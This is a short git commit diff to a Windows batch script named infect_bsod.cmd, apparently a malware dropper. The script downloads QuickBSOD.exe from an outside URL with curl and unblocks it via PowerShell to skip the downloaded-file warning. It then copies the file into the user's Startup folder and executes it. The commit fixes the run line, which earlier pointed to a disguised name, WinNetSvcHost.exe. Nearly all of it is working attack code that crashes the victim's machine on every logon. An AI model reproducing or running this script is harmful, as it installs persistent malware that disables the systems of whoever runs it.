0539a3e2c2426af5e2a1dab450176732c156f19d
ultrapg <marvinspath9261@gmail.com>
2026-05-15 17:18:52 +0200

    Fix command to copy QuickBSOD.exe to Startup

--- infect_bsod.cmd
+++ infect_bsod.cmd
@@ -3,4 +3,4 @@ set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickB
 curl -L -o "%TEMP%\QuickBSOD.exe" %dlurl% >nul 2>&1
 powershell -c "Unblock-File -Path $env:TEMP\QuickBSOD.exe" >nul 2>&1
 copy "%TEMP%\QuickBSOD.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\QuickBSOD.exe"
-"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
+"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\QuickBSOD.exe"
